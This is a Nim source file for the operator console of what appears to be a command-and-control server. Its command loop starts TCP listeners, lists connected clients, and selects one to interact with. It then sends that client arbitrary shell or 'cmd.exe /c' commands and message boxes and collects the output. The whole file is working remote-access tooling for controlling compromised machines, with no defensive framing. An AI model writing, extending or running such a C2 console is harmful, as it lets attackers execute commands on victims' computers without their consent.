import asyncdispatch, asyncnet, threadpool, asyncfutures
import strutils, terminal

import listeners/[tcp]
import communication

import types, logging

proc procStdin*(server: C2Server) {.async.} =
  var handlingClient: C2Client

  prompt(handlingClient, server)
  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():
      
      let input = ^messageFlowVar
      let args = input.split(" ")
      let argsn = len(args)
      let cmd = args[0]
      let a_args = args[1..(argsn - 1)].join(" ")

      case cmd:
        of "help":
            echo "-- Navigation"
            echo "\texit\twhy would you ever exit?"
            echo "\tback\tgo back to main menu"
            echo "\tinteract [id]\tinteract with a client"
            echo "-- Listeners"
            echo "\tstartlistener [type] [..args]\tstart a listener"
            echo "\tlisteners\tshow a list of listeners"
            echo "\tclientlisteners\tshow a list of listeners and their clients"
            echo "-- Managing clients"
            echo "\tclients\tview a list of clients"
            echo "\tinfo\tget info about a client"
            echo "\tshell\trun a shell command"
            echo "\tcmd\trun a cmd command ('cmd.exe /c')"
            echo "\tmsgbox\tsend a message box"
        of "listeners":
            for tcpListener in server.tcpListeners:
                infoLog @tcpListener
            infoLog $len(server.tcpListeners) & " listeners"
        of "clientlisteners":
            for tcpListener in server.tcpListeners:
                infoLog @tcpListener
                for client in server.clients:
                    if client.listenerType == "tcp" and client.listenerId == tcpListener.id:
                        infoLog "\t<- " & $client
            infoLog $len(server.tcpListeners) & " listeners"
        of "startlistener":
            if argsn >= 2:
                if args[1] == "TCP":
                    if argsn >= 4:
                        asyncCheck server.createNewTcpListener(parseInt(args[3]), args[2])
                    else:
                        echo "Bad usage, correct usage: startlistener TCP (ip) (port)"
            else:
                echo "You need to specify the type of listener you wanna start, supported: TCP"
        of "clients":
            for client in server.clients:
                if client.connected:
                    stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
                else:
                    stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
            infoLog $len(server.clients) & " clients currently connected"
        of "interact":
            for client in server.clients:
                if client.id == parseInt(args[1]):
                    handlingClient = client
            if handlingClient.isNil() or handlingClient.id != parseInt(args[1]):
                infoLog "client not found"
        of "info":
            echo @handlingClient
        of "shell":
            await handlingClient.sendShellCmd(a_args)
            await handlingClient.awaitResponse()
        of "cmd":
            await handlingClient.sendShellCmd("cmd.exe /c " & a_args)
            await handlingClient.awaitResponse()
        of "msgbox":
            if argsn >= 3:
                let slashSplit = a_args.split("/")
                await handlingClient.sendMsgBox(slashSplit[1].strip(), slashSplit[0].strip())
            else:
                echo "wrong usage. msgbox (title) / (caption)"
        of "back": 
            handlingClient = nil
        of "exit":
            for tcpListener in server.tcpListeners:
                tcpListener.running = false
                tcpListener.socket.close()

            # quit(0)

      prompt(handlingClient, server)
      messageFlowVar = spawn stdin.readLine()
      
    await asyncdispatch.sleepAsync(100)
